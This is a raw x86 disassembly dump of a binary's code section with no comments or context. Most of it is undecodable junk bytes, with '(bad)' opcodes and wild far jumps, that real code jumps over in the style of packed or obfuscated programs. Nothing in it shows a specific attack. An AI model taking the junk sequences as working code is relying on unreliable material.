  40a7cb:	cmp    DWORD PTR ds:0x43051e,0x10
  40a7d2:	jae    0x40a821
  40a7d8:	cmp    DWORD PTR ds:0x43051e,0x9
  40a7df:	jne    0x40a7f1
  40a7e5:	push   DWORD PTR [ebp-0x24]
  40a7e8:	push   DWORD PTR [ebp-0x10]
  40a7eb:	call   DWORD PTR ds:0x42ec50
  40a7f1:	cmp    DWORD PTR ds:0x43051e,0x8
  40a7f8:	jne    0x40a809
  40a7fe:	mov    eax,ds:0x43051e
  40a803:	inc    eax
  40a804:	mov    ds:0x43051e,eax
  40a809:	jmp    0x40a7c0
  40a80e:	mov    ecx,DWORD PTR ds:0x430552
  40a814:	xor    edx,edx
  40a816:	add    edx,DWORD PTR ds:0x430556
  40a81c:	sub    ecx,edx
  40a81e:	xor    ecx,DWORD PTR [ecx+edx*1]
  40a821:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40a828:	sbb    ecx,0x259c
  40a82e:	jmp    0x40aa29
  40a833:	imul   ebp,ecx,0x7a81ca81
  40a839:	jge    0x40a8a8
  40a83b:	dec    esp
  40a83c:	jb     0x40a8a1
  40a83e:	jmp    0x40a7fd
  40a840:	push   ebp
  40a841:	push   0xffffffc7
  40a843:	adc    eax,0x5c7e7eeb
  40a848:	jg     0x40a8c8
  40a84a:	jle    0x40a86b
  40a84c:	xlat   BYTE PTR ds:[ebx]
  40a84d:	inc    ebx
  40a84e:	cld    
  40a84f:	push   ss
  40a850:	pop    ebx
  40a851:	leave  
  40a852:	inc    edx
  40a853:	daa    
  40a854:	jns    0x40a828
  40a856:	repz arpl WORD PTR [ecx],si
  40a859:	mul    ebx
  40a85b:	ret    
  40a85c:	xchg   esp,eax
  40a85d:	push   0xe5fe4d05
  40a862:	fbld   TBYTE PTR [ebx-0x37]
  40a865:	add    al,0xbc
  40a867:	and    eax,DWORD PTR [eax]
  40a869:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a86a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a86b:	xchg   edi,eax
  40a86c:	and    eax,0xbbdb0de6
  40a871:	enter  0xf6fc,0x7e
  40a875:	dec    esi
  40a876:	ror    BYTE PTR [ebp-0x4],0xaf
  40a87a:	ret    
  40a87b:	mov    ebp,0x66e3cdb6
  40a880:	out    dx,eax
  40a881:	jbe    0x40a8cb
  40a883:	jmp    0xf09a:0x2d0068c
  40a88a:	adc    al,BYTE PTR [edx+0x18]
  40a88d:	nop
  40a88e:	jnp    0x40a84e
  40a890:	jle    0x40a8b4
  40a892:	ret    
  40a893:	dec    esi
  40a894:	in     eax,0x84
  40a896:	mov    dl,0xcf
  40a898:	mov    DWORD PTR [edx+0x59],ecx
  40a89b:	retf   
  40a89c:	pop    esi
  40a89d:	lods   al,BYTE PTR ds:[esi]
  40a89e:	int    0x84
  40a8a0:	cmp    esp,edi
  40a8a2:	inc    edx
  40a8a3:	mov    bl,BYTE PTR [edi+0x5d]
  40a8a6:	jecxz  0x40a879
  40a8a8:	sbb    dl,BYTE PTR [ecx-0x17]
  40a8ab:	in     al,dx
  40a8ac:	and    bh,bl
  40a8ae:	or     al,0x11
  40a8b0:	adc    ah,BYTE PTR [edx+edx*4-0x3226b056]
  40a8b7:	xchg   esp,eax
  40a8b8:	aam    0xdb
  40a8ba:	cwd    
  40a8bc:	cmp    eax,0x125bc778
  40a8c1:	mov    ah,0x25
  40a8c3:	test   BYTE PTR ds:0x89c28bd8,0xe3
  40a8ca:	outs   dx,DWORD PTR ds:[esi]
  40a8cb:	sbb    al,0x9d
  40a8cd:	sbb    al,0x68
  40a8cf:	lods   eax,DWORD PTR ds:[esi]
  40a8d0:	mov    ebx,DWORD PTR [ebx+0x6e]
  40a8d3:	mov    esp,0xa584c026
  40a8d8:	pop    ds
  40a8d9:	push   edi
  40a8da:	mov    edx,0x1a8177a
  40a8df:	xchg   edx,eax
  40a8e0:	sbb    ah,BYTE PTR [eax+0x70]
  40a8e3:	mov    eax,0x23429cd
  40a8e8:	add    al,BYTE PTR [eax+0x6f]
  40a8eb:	mov    ebx,0xab49be0c
  40a8f0:	shr    cl,1
  40a8f2:	(bad)  
  40a8f4:	jnp    0x40a88f
  40a8f6:	fsub   QWORD PTR [ebx-0x55]
  40a8f9:	in     al,dx
  40a8fa:	xlat   BYTE PTR ds:[ebx]
  40a8fb:	(bad)  
  40a8fc:	jae    0x40a88b
  40a8fe:	inc    edi
  40a8ff:	pushf  
  40a900:	jne    0x40a905
  40a902:	cmp    eax,edx
  40a904:	lock or dl,BYTE PTR [ebp+0x5e50989d]
  40a90b:	xchg   ecx,eax
  40a90c:	(bad)
  40a90f:	das    
  40a910:	fldcw  WORD PTR [ebx-0x41]
  40a913:	test   al,0x50
  40a915:	imul   esi,esp,0x5423b300
  40a91b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a91c:	cli    
  40a91d:	in     eax,0x1e
  40a91f:	loope  0x40a8cb
  40a921:	std    
  40a922:	je     0x40a93a
  40a924:	iret   
  40a925:	push   eax
  40a926:	sahf   
  40a927:	popfw  
  40a929:	xlat   BYTE PTR ds:[ebx]
  40a92a:	and    ecx,DWORD PTR [eax+0x4]
  40a92d:	lods   eax,DWORD PTR ds:[esi]
  40a92e:	inc    ebp
  40a92f:	push   edx
  40a930:	jg     0x40a969
  40a932:	or     DWORD PTR [edi+0x35],eax
  40a935:	lods   eax,DWORD PTR ds:[esi]
  40a936:	mov    edx,esi
  40a938:	pop    eax
  40a939:	or     al,0x41
  40a93b:	or     al,0x87
  40a93d:	scas   al,BYTE PTR es:[edi]
  40a93e:	rol    BYTE PTR [ebp+edx*8+0x1c],cl
  40a942:	add    DWORD PTR ds:0x6ef76b5f,0x1d
  40a949:	cmp    al,BYTE PTR [eax+0x1212ec77]
  40a94f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a950:	push   ebp
  40a951:	or     eax,0xcad5949a
  40a956:	dec    ecx
  40a957:	daa    
  40a958:	test   DWORD PTR [edi+ecx*1-0x690c8184],0x71407a08
  40a963:	pop    ecx
  40a964:	fnstenv [edx+0xa73b6d]
  40a96a:	inc    edi
  40a96b:	add    al,BYTE PTR [ecx+ebp*2]
  40a96e:	and    al,0x92
  40a970:	pop    edx
  40a971:	sbb    DWORD PTR [esi],ecx
  40a973:	push   esi
  40a974:	sbb    al,0x69
  40a976:	and    BYTE PTR [eax+0x4af89b47],cl
  40a97c:	stos   DWORD PTR es:[edi],eax
  40a97d:	ja     0x40a9d0
  40a97f:	mov    eax,0x94f57aa1
  40a984:	hlt    
  40a985:	fadd   QWORD PTR [eax-0x35]
  40a988:	ss aad 0xa
  40a98b:	imul   ecx,DWORD PTR [esi],0xffffff93
  40a98e:	adc    DWORD PTR [ebx+0x298b68d7],ecx
  40a994:	in     al,dx
  40a995:	add    ah,BYTE PTR [eax]
  40a997:	sub    DWORD PTR [bp+di+0x3dfa],ebp
  40a99c:	repnz sbb BYTE PTR [ecx+0x5e],bl
  40a9a0:	out    dx,al
  40a9a1:	out    0x41,al
  40a9a3:	sub    dl,BYTE PTR [esi]
  40a9a5:	add    DWORD PTR [esp+ecx*1],edi
  40a9a8:	pushf  
  40a9a9:	add    esi,DWORD PTR [eax]
  40a9ab:	dec    ebx
  40a9ac:	out    0xb5,al
  40a9ae:	mov    bh,0x9a
  40a9b0:	cmp    DWORD PTR [ebx],ecx
  40a9b2:	add    BYTE PTR [edi+0x25],dh
  40a9b5:	xchg   BYTE PTR [eax-0x67],dl
  40a9b8:	xor    edi,esp
  40a9ba:	fsubr  DWORD PTR [eax]
  40a9bc:	mov    cl,0xa2
  40a9be:	nop
  40a9bf:	add    DWORD PTR [ebx+0x71],edi
  40a9c2:	pop    eax
  40a9c3:	std    
  40a9c4:	jmp    0xfa6858de
  40a9c9:	stos   DWORD PTR es:[edi],eax
  40a9ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9cb:	push   ebp
  40a9cc:	or     al,0xff
  40a9ce:	xor    ecx,edx
  40a9d0:	mov    esp,0xeba91613
  40a9d5:	xchg   DWORD PTR [ebp-0x6de3d5e9],ebp
  40a9db:	aam    0x8e
  40a9dd:	(bad)  
  40a9de:	jp     0x40aa31
  40a9e0:	in     eax,0x62
  40a9e2:	pop    ds
  40a9e3:	and    ecx,DWORD PTR [eax+0x631fca8e]
  40a9e9:	cmc    
  40a9ea:	xchg   DWORD PTR [ebp+ebx*2+0x5b9a5528],esi
  40a9f1:	inc    esi
  40a9f2:	out    dx,al
  40a9f3:	push   0x60c3da1e
  40a9f8:	(bad)  
  40a9f9:	pavgb  mm5,QWORD PTR [eax+0x62]
  40a9fd:	mov    ecx,0x1338f683
  40aa02:	xchg   esi,eax
  40aa03:	call   0x9fae5acb
  40aa08:	inc    eax
  40aa09:	out    0xac,al
  40aa0b:	cmc    
  40aa0c:	scas   eax,DWORD PTR es:[edi]
  40aa0d:	ja     0x40a9d4
  40aa0f:	push   ebx
  40aa10:	add    ecx,0xfc732b33
  40aa16:	mul    BYTE PTR [eax]
  40aa18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa19:	sahf   
  40aa1a:	scas   al,BYTE PTR es:[edi]
  40aa1b:	mov    ds:0x6b789006,eax
  40aa20:	out    dx,al
  40aa21:	fsub   DWORD PTR [ebx]
  40aa23:	cmp    dl,BYTE PTR ds:0xf90a3d81
  40aa29:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40aa30:	or     edx,ecx
  40aa32:	mov    eax,DWORD PTR [ebp-0x4]
  40aa35:	push   esi
  40aa36:	or     ecx,edx
  40aa38:	mov    esi,DWORD PTR [ebp-0x8]
  40aa3b:	add    ecx,ecx
  40aa3d:	mov    edx,0x7510856
  40aa42:	xor    eax,edx
  40aa44:	xor    DWORD PTR ds:0x42e7e2,0x78fe
  40aa4e:	xor    esi,edx
  40aa50:	dec    ecx
  40aa51:	mov    ecx,0x32729d
  40aa56:	add    esi,ecx
  40aa58:	add    DWORD PTR ds:0x4305da,0x42e7e2
  40aa62:	add    eax,ecx
  40aa64:	imul   eax,esi
  40aa67:	mov    esi,DWORD PTR [ebp+0xc]
  40aa6a:	mov    DWORD PTR ds:0x42e7da,0x6fc4
  40aa74:	cmp    esi,eax
  40aa76:	mov    DWORD PTR ds:0x4305d6,0x4d9
  40aa80:	jne    0x40ae92
  40aa86:	mov    eax,DWORD PTR [ebp-0x4]
  40aa89:	mov    esi,DWORD PTR [ebp-0x8]
  40aa8c:	jmp    0x40ac87
  40aa91:	fisubr DWORD PTR [ebp-0x80]
  40aa94:	cld    
  40aa95:	mov    eax,ds:0x406d7afd
  40aa9a:	adc    DWORD PTR [ecx-0x7],esp
  40aa9d:	dec    eax
  40aa9e:	pop    ss
  40aa9f:	push   ebx
  40aaa0:	test   BYTE PTR [ebx-0x13],dh
  40aaa3:	jle    0x40ab23
  40aaa5:	pop    esp
  40aaa6:	jg     0x40ab26
  40aaa8:	jle    0x40ab08
  40aaaa:	popa   
  40aaab:	xor    BYTE PTR [esi],bh
  40aaad:	out    dx,eax
  40aaae:	mov    eax,DWORD PTR [ebx+0x2d]
  40aab1:	mov    bh,0x2
  40aab3:	jp     0x40ab07
  40aab5:	jmp    0x9d3954c6
  40aaba:	dec    edi
  40aabb:	add    bl,ch
  40aabd:	and    BYTE PTR [edx],cl
  40aabf:	lds    ebp,FWORD PTR [edi]
  40aac1:	mov    eax,eax
  40aac3:	cmp    esi,DWORD PTR [edi]
  40aac5:	xor    al,0x14
  40aac7:	xor    al,0x37
  40aac9:	dec    esi
  40aaca:	aam    0x8f
  40aacc:	ss sub al,0x52
  40aacf:	add    eax,0xc5af8bec
  40aad4:	sbb    BYTE PTR [esi+ebp*2-0x25ed816b],ch
  40aadb:	mov    ds:0x7595752a,al
  40aae0:	retf   
  40aae1:	in     al,0x13
  40aae3:	inc    esi
  40aae4:	and    eax,edx
  40aae6:	inc    edx
  40aae7:	jmp    0x739d041b
  40aaec:	mov    BYTE PTR [edi],al
  40aaee:	imul   edi,eax,0x3c
  40aaf1:	in     al,dx
  40aaf2:	aaa    
  40aaf3:	mov    eax,ds:0x2c1574f1
  40aaf8:	pusha  
  40aaf9:	mov    ebx,0x6c7de785
  40aafe:	mov    bh,0x81
  40ab00:	aas    
  40ab01:	pop    ebx
  40ab02:	mov    esi,0x53b36b62
  40ab07:	inc    esp
  40ab08:	or     BYTE PTR [ebp-0x3ec11ce5],bh
  40ab0e:	jmp    0x1737:0x4e9a6584
  40ab15:	bound  ebp,QWORD PTR [ebp-0x7f]
  40ab18:	jns    0x40ab80
  40ab1a:	fs (bad) 
  40ab1c:	repnz push esp
  40ab1e:	retf   
  40ab1f:	mov    dl,0xa
  40ab21:	call   0x3704d7e9
  40ab26:	xchg   ebp,eax
  40ab27:	in     al,0xb5
  40ab29:	pop    ebx
  40ab2a:	push   ebp
  40ab2b:	scas   al,BYTE PTR es:[edi]
  40ab2c:	push   cs
  40ab2d:	xchg   esp,eax
  40ab2e:	loopne 0x40ab9b
  40ab30:	jle    0x40aab7
  40ab32:	add    al,0xf5
  40ab34:	xor    al,BYTE PTR [eax-0x6e]
  40ab37:	mov    edi,0xc51bc3e0
  40ab3c:	mov    DWORD PTR [ebp-0x53597d87],0xe309a7a3
  40ab46:	jb     0x40abbc
  40ab48:	retf   
  40ab49:	sti    
  40ab4a:	cmp    edi,ecx
  40ab4c:	inc    ebp
  40ab4d:	cmp    eax,0x53c24b0d
  40ab52:	idiv   ah
  40ab54:	mov    DWORD PTR [eax-0x62],ebx
  40ab57:	das    
  40ab58:	fucomip st,st(4)
  40ab5a:	xor    al,0x1d
  40ab5c:	mov    bl,0xc
  40ab5e:	add    ch,BYTE PTR [ebx+ecx*8+0x4a8252f]
  40ab65:	adc    esp,DWORD PTR [eax+0x4a]
  40ab68:	fwait
  40ab69:	call   0xc175b153
  40ab6e:	fnstenv [ecx]
  40ab70:	je     0x40abc8
  40ab72:	outs   dx,BYTE PTR es:[esi]
  40ab74:	sub    al,0xa8
  40ab76:	fsub   QWORD PTR [edi+eiz*2+0x5c711378]
  40ab7d:	cs jnp 0x40ab51
  40ab80:	add    ah,BYTE PTR [edi+edi*2-0x6b]
  40ab84:	push   eax
  40ab85:	in     eax,0xac
  40ab87:	mov    ah,0x6b
  40ab89:	aaa    
  40ab8a:	jns    0x40abaa
  40ab8c:	inc    eax
  40ab8d:	jbe    0x40abf0
  40ab8f:	loope  0x40ab43
  40ab91:	sub    al,0xb
  40ab93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab94:	jp     0x40abc8
  40ab96:	daa    
  40ab97:	test   WORD PTR [ecx],0x73e
  40ab9c:	push   ebx
  40ab9d:	mov    ecx,0x9a343c5f
  40aba2:	(bad)  
  40aba3:	dec    ecx
  40aba4:	lock das 
  40aba6:	loopne 0x40ab29
  40aba8:	sbb    al,0x1a
  40abaa:	loop   0x40abd8
  40abac:	and    ch,BYTE PTR [edi+0x30a7f74e]
  40abb2:	dec    ebp
  40abb3:	pop    ss
  40abb4:	mov    cl,0x72
  40abb6:	call   0x14ce:0x341a6ad9
  40abbd:	add    eax,0xfcf0919
  40abc2:	inc    edx
  40abc3:	into   
  40abc4:	(bad)  
  40abc5:	pop    esp
  40abc6:	and    esp,DWORD PTR [ecx*2+0x243e8f3b]
  40abcd:	sbb    DWORD PTR [edi+0x1dad1f38],edx
  40abd3:	adc    dh,bl
  40abd5:	ret    
  40abd6:	ins    BYTE PTR es:[edi],dx
  40abd7:	push   ss
  40abd8:	stc    
  40abd9:	xchg   ecx,eax
  40abda:	data16 mov dh,ch
  40abdd:	stos   BYTE PTR es:[edi],al
  40abde:	mov    ds:0x28d0fd6b,eax
  40abe3:	jmp    0x7212:0xde8d05c2
  40abea:	test   DWORD PTR [ebp-0x2d],0xdbc5845f
  40abf1:	fisubr WORD PTR [ebp-0x73]
  40abf4:	or     cl,BYTE PTR [esp+eax*1]
  40abf7:	dec    esp
  40abf8:	or     ah,bh
  40abfa:	pushf  
  40abfb:	rcr    dl,cl
  40abfd:	pushf  
  40abfe:	xor    DWORD PTR [ecx],esp
  40ac00:	jecxz  0x40ac1c
  40ac02:	pop    ebx
  40ac03:	call   0x9b8c1eda
  40ac08:	jbe    0x40ac42
  40ac0a:	or     dl,bh
  40ac0c:	sbb    al,0x67
  40ac0e:	xchg   BYTE PTR [ebp-0x42],bl
  40ac11:	fild   WORD PTR ds:0x572e668f
  40ac17:	or     eax,0x1cbabd06
  40ac1c:	mov    al,0x8a
  40ac1e:	in     eax,dx
  40ac1f:	and    DWORD PTR [edi],ebp
  40ac21:	sbb    eax,0x587f5ea
  40ac26:	fisubr WORD PTR [esi]
  40ac28:	inc    ebx
  40ac29:	mov    WORD PTR [eax+0x15],?
  40ac2c:	jmp    DWORD PTR [edi+ebx*4-0x59]
  40ac30:	jb     0x40ac46
  40ac32:	out    dx,eax
  40ac33:	stos   DWORD PTR es:[edi],eax
  40ac34:	dec    esp
  40ac35:	repz das 
  40ac37:	ja     0x40abde
  40ac39:	xchg   ecx,eax
  40ac3a:	xchg   ecx,eax
  40ac3b:	outs   dx,DWORD PTR ds:[esi]
  40ac3c:	mov    cl,0xdf
  40ac3e:	jmp    0x40acac
  40ac40:	retf   0x60cb
  40ac43:	push   0x35f23b92
  40ac48:	out    0xe7,eax
  40ac4a:	adc    al,0x93
  40ac4c:	into   
  40ac4d:	xor    eax,0x9ddb08bd
  40ac52:	jl     0x40acb6
  40ac54:	fs mov eax,0x7fc61c9a
  40ac5a:	in     al,dx
  40ac5b:	adc    eax,0x3ca043f1
  40ac60:	mov    al,0x1f
  40ac62:	dec    si
  40ac64:	jo     0x40ac9e
  40ac66:	and    eax,0xe7197c9e
  40ac6b:	cdq    
  40ac6c:	jp     0x40acba
  40ac6e:	ror    DWORD PTR [ebx+0x61],1
  40ac71:	cli    
  40ac72:	pop    edx
  40ac73:	push   ebx
  40ac74:	lds    edx,FWORD PTR [edi+eiz*1]
  40ac77:	ds pop eax
  40ac79:	or     eax,0x2f4afbbe
  40ac7e:	xor    bh,0x62
  40ac81:	xchg   esi,eax
  40ac82:	adc    cl,BYTE PTR [ecx-0x6d]
  40ac85:	retf   
  40ac86:	mov    WORD PTR [ebx],?
  40ac88:	ret    0xf233
  40ac8b:	add    eax,ecx
  40ac8d:	jmp    0x40ae88
  40ac92:	pop    ebp
  40ac93:	icebp  
  40ac94:	lds    esp,FWORD PTR [eax-0x23]
  40ac97:	fs jge 0x40ac47
  40ac9a:	xchg   edi,eax
  40ac9b:	imul   ebx,edx,0x5544b502
  40aca1:	xlat   BYTE PTR ds:[ebx]
  40aca2:	push   ecx
  40aca3:	out    dx,al
  40aca4:	jle    0x40ad24
  40aca6:	pop    esp
  40aca7:	jg     0x40ad27
  40aca9:	jle    0x40ac41
  40acab:	ins    BYTE PTR es:[edi],dx
  40acac:	mov    ah,0x86
  40acae:	in     al,dx
  40acaf:	mov    dh,0x2b
  40acb1:	xor    al,0xc6
  40acb3:	pop    ebx
  40acb4:	xchg   ebx,eax
  40acb5:	push   0x672976f3
  40acba:	fnstsw WORD PTR [edi+0xcb1b02e]
  40acc0:	adc    dl,BYTE PTR [edi]
  40acc2:	inc    esi
  40acc3:	mov    WORD PTR [esi-0x7],fs
  40acc6:	pop    eax
  40acc7:	pop    ebx
  40acc8:	xchg   ecx,eax
  40acc9:	mov    al,ds:0x87320432
  40acce:	(bad)  
  40accf:	jle    0x40ac71
  40acd1:	cmp    al,0x38
  40acd3:	xor    BYTE PTR [ebp+0xd2799f0],bl
  40acd9:	dec    ebp
  40acda:	or     DWORD PTR ds:0xf07198bb,eax
  40ace0:	xchg   edx,eax
  40ace1:	out    dx,eax
  40ace2:	push   0x7e
  40ace4:	xchg   esi,eax
  40ace5:	push   0x40
  40ace7:	retf   
  40ace8:	adc    DWORD PTR [eax+edx*2],0xb3b48baa
  40acef:	sub    eax,DWORD PTR ds:0x5efe80a2
  40acf5:	push   eax
  40acf6:	inc    ebx
  40acf7:	test   al,0x72
  40acf9:	jmp    0x40ad46
  40acfb:	sbb    eax,0xf58cca79
  40ad00:	jae    0x40ad4f
  40ad02:	jmp    0x40acea
  40ad04:	sub    dh,BYTE PTR [ebx+0x4b]
  40ad07:	stos   BYTE PTR es:[edi],al
  40ad08:	popa   
  40ad09:	sahf   
  40ad0a:	cmp    edx,DWORD PTR [ecx+0x17]
  40ad0d:	loop   0x40ad61
  40ad0f:	push   esi
  40ad10:	into   
  40ad11:	cmc    
  40ad12:	sub    BYTE PTR [ebp+0x58],cl
  40ad15:	or     cl,al
  40ad17:	ret    0xd169
  40ad1a:	loopne 0x40ad58
  40ad1c:	push   esi
  40ad1d:	push   ss
  40ad1e:	scas   al,BYTE PTR es:[edi]
  40ad1f:	mov    edi,0x18de859c
  40ad24:	sub    eax,ebx
  40ad26:	fst    QWORD PTR [esi-0x23cd0d93]
  40ad2c:	(bad)  
  40ad2d:	aas    
  40ad2e:	(bad)  
  40ad2f:	fild   WORD PTR ds:0x763ae29d
  40ad35:	push   cs
  40ad36:	mov    dh,0x8c
  40ad38:	pop    esi
  40ad39:	rcl    eax,0xe1
  40ad3c:	adc    cl,BYTE PTR [ebp+0x18]
  40ad3f:	xor    eax,0xb404ccb3
  40ad44:	icebp  
  40ad45:	pop    edi
  40ad46:	test   DWORD PTR ds:0xb1340eb7,ebx
  40ad4c:	mov    ?,WORD PTR [ebx-0x17]
  40ad4f:	lds    ebp,FWORD PTR [edx+0x1a]
  40ad52:	idiv   DWORD PTR [esi-0x2e]
  40ad55:	push   ebx
  40ad56:	iret   
  40ad57:	fimul  DWORD PTR [edi]
  40ad59:	mov    al,ds:0x244de6fc
  40ad5e:	or     DWORD PTR [ebp+0x1d],eax
  40ad61:	sub    bl,BYTE PTR [ebx-0x1a09883f]
  40ad67:	fnsave [ecx+0x36]
  40ad6a:	jge    0x40ad7d
  40ad6c:	clc    
  40ad6d:	mov    ebp,0xfff7c621
  40ad72:	cmp    eax,0xe5e26001
  40ad77:	mov    edx,0x42f601c
  40ad7c:	dec    esi
  40ad7d:	cmp    al,BYTE PTR [edx-0x71c0f353]
  40ad83:	mov    ecx,DWORD PTR [ecx-0x23ee3af6]
  40ad89:	push   esi
  40ad8a:	pop    ds
  40ad8b:	adc    al,0xb8
  40ad8d:	lahf   
  40ad8e:	add    DWORD PTR [ecx-0x675366a2],edi
  40ad94:	pop    ds
  40ad95:	imul   DWORD PTR [ebx]
  40ad97:	xchg   ch,dl
  40ad99:	lea    esp,[edi+0x63b6de91]
  40ad9f:	mov    esi,0x334ee8d
  40ada4:	add    DWORD PTR [edx-0x6d],esp
  40ada7:	cld    
  40ada8:	verr   WORD PTR [ecx+0x5de856c8]
  40adaf:	sub    al,0xd7
  40adb1:	popf   
  40adb2:	ret    0x2466
  40adb5:	jmp    0x40ae0b
  40adb7:	ins    BYTE PTR es:[edi],dx
  40adb8:	fwait
  40adb9:	ror    DWORD PTR [edi],cl
  40adbb:	dec    edx
  40adbc:	cwde   
  40adbd:	inc    eax
  40adbe:	(bad)  
  40adbf:	js     0x40ad96
  40adc1:	mov    DWORD PTR [edx-0x262eeed1],edx
  40adc7:	fstp   st(5)
  40adc9:	std    
  40adca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adcb:	(bad)  [ebp-0x36]
  40adce:	fisub  DWORD PTR [esi-0x7e]
  40add1:	test   eax,0x360cb903
  40add6:	inc    edx
  40add7:	pop    ds
  40add8:	rcr    esi,0x6f
  40addb:	and    al,0xdf
  40addd:	idiv   al
  40addf:	sbb    dl,BYTE PTR [esi-0x21]
  40ade2:	fimul  WORD PTR [esi+esi*2]
  40ade5:	sub    bh,BYTE PTR [edx+0x5ed764c1]
  40adeb:	cdq    
  40adec:	fcomp  DWORD PTR [esi]
  40adee:	push   0x11f358f8
  40adf3:	es ret 
  40adf5:	(bad)  
  40adf6:	(bad)  
  40adf7:	out    0x39,eax
  40adf9:	daa    
  40adfa:	xor    BYTE PTR [edi-0x6250099b],bl
  40ae00:	dec    eax
  40ae01:	in     al,0xa0
  40ae03:	add    eax,DWORD PTR [ebx+0x3f2d6514]
  40ae09:	pop    ss
  40ae0a:	sub    DWORD PTR [eax+0x39],esp
  40ae0d:	bound  esi,QWORD PTR [eax+esi*8]
  40ae10:	sbb    dl,BYTE PTR [esi+0x628c49cd]
  40ae16:	rcr    DWORD PTR [ebx],1
  40ae18:	sbb    cl,bl
  40ae1a:	jecxz  0x40adf9
  40ae1c:	cmp    BYTE PTR [eax+ebx*8-0x45],0xe7
  40ae21:	cmp    DWORD PTR [ebx+0x66],ecx
  40ae24:	pushf  
  40ae25:	outs   dx,DWORD PTR ds:[esi]
  40ae26:	xchg   ebp,eax
  40ae27:	fisubr DWORD PTR [ecx+0x3e]
  40ae2a:	and    bh,bh
  40ae2c:	ret    0x28c4
  40ae2f:	sbb    al,0x4b
  40ae31:	repnz sbb al,0x47
  40ae34:	mov    al,ds:0x6f5b83b6
  40ae39:	imul   edx,edx,0xffffffc7
  40ae3c:	call   0x7ac1:0x259cd2f6
  40ae43:	jecxz  0x40aebd
  40ae45:	mul    DWORD PTR [ecx+0x13fa2216]
  40ae4b:	popa   
  40ae4c:	stc    
  40ae4d:	push   ecx
  40ae4e:	adc    dl,dh
  40ae50:	sbb    ch,BYTE PTR [eax+ebx*8-0x51c3768]
  40ae57:	addr16 jae 0x40adf0
  40ae5a:	in     eax,0x8d
  40ae5c:	lods   eax,DWORD PTR ds:[esi]
  40ae5d:	mov    bh,0xa2
  40ae5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae61:	shr    DWORD PTR [edx],1
  40ae63:	jp     0x40aea1
  40ae65:	cmp    dl,BYTE PTR [edx-0x31743841]
  40ae6b:	pop    edx
  40ae6c:	call   0x932d6d32
  40ae71:	mov    dl,0x59
  40ae73:	pushf  
  40ae74:	xor    BYTE PTR [edx+eiz*8+0x48],dh
  40ae78:	fwait
  40ae79:	sbb    al,0x76
  40ae7b:	ja     0x40aeb9
  40ae7d:	jmp    0xd45eef9c
  40ae82:	jp     0x40ae5c
  40ae84:	push   ecx
  40ae85:	loop   0x40ae16
  40ae87:	hlt    
  40ae88:	add    esi,ecx
  40ae8a:	imul   eax,esi
  40ae8d:	jmp    0x40b2c3
  40ae92:	mov    eax,DWORD PTR [ebp+0xc]
  40ae95:	mov    eax,DWORD PTR [eax+0x78]
  40ae98:	mov    DWORD PTR [ebp+0xc],eax
  40ae9b:	mov    eax,DWORD PTR [ebp-0x4]
  40ae9e:	mov    esi,DWORD PTR [ebp-0x8]
  40aea1:	jmp    0x40b09c
  40aea6:	aad    0xc4
  40aea8:	outs   dx,DWORD PTR ds:[esi]
  40aea9:	mov    BYTE PTR [edi-0x53],ch
  40aeac:	std    
  40aead:	jge    0x40af09
  40aeaf:	outs   dx,DWORD PTR ds:[esi]
  40aeb0:	stos   DWORD PTR es:[edi],eax
  40aeb1:	lock je 0x40aecb
  40aeb4:	stos   DWORD PTR es:[edi],eax
  40aeb5:	cmp    edi,DWORD PTR [edi+0x5c7e7ee0]
  40aebb:	jg     0x40af3b
  40aebd:	jle    0x40ae9f
  40aebf:	mov    ebp,DWORD PTR [edx-0x45aac6e0]
  40aec5:	mov    dl,0x76
  40aec7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aec8:	and    al,0x57
  40aeca:	and    BYTE PTR [ebx],ch
  40aecc:	clc    
  40aecd:	(bad)  [edi-0x1bced2d9]
  40aed3:	fisub  DWORD PTR [edx+edx*2+0x59]
  40aed7:	stc    
  40aed8:	popf   
  40aed9:	out    0xd5,al
  40aedb:	rol    DWORD PTR [ebp+0x5b],cl
  40aede:	pop    ss
  40aedf:	dec    esi
  40aee0:	add    DWORD PTR [eax],esp
  40aee2:	inc    esp
  40aee3:	retf   0x5661
  40aee6:	mov    al,ds:0x38321630
  40aeeb:	pop    es
  40aeec:	out    dx,eax
  40aeed:	push   ds
  40aeee:	adc    esi,ebx
  40aef0:	sar    DWORD PTR [ebx+edi*4-0x56d73b4e],1
  40aef7:	(bad)  
  40aef8:	lods   eax,DWORD PTR ds:[esi]
  40aef9:	shr    BYTE PTR [edi],0x8f
  40aefc:	cmp    BYTE PTR [ebx+0x5b],bl
  40aeff:	sar    DWORD PTR [edi+0x178964d4],cl
  40af05:	test   eax,0x43a32e3d
  40af0a:	adc    ch,ch
  40af0c:	cmp    ah,BYTE PTR [edx]
  40af0e:	cmc    
  40af0f:	test   eax,edi
  40af11:	sbb    bl,0x20
  40af14:	sahf   
  40af15:	pop    es
  40af16:	jmp    0x2ba962b3
  40af1b:	cdq    
  40af1c:	jnp    0x40ae9e
  40af1e:	push   ss
  40af1f:	or     ah,BYTE PTR [edi]
  40af21:	fstp   TBYTE PTR [ebx+0x6570a3e9]
  40af27:	loope  0x40aef7
  40af29:	cmp    dh,ch
  40af2b:	mov    ss,WORD PTR [edi]
  40af2d:	adc    DWORD PTR [edi-0x4040210a],ebx
  40af33:	test   DWORD PTR [bp+di+0xd2c],edi
  40af38:	lods   al,BYTE PTR ds:[esi]
  40af39:	hlt    
  40af3a:	cmc    
  40af3b:	xchg   ecx,eax
  40af3c:	cld    
  40af3d:	shl    DWORD PTR [edi-0x14],1
  40af40:	xor    ebx,DWORD PTR [edi-0x7b]
  40af43:	push   ecx
  40af44:	call   0x95dc1080
  40af49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af4a:	js     0x40af2d
  40af4c:	xchg   esp,eax
  40af4d:	push   0x52576045
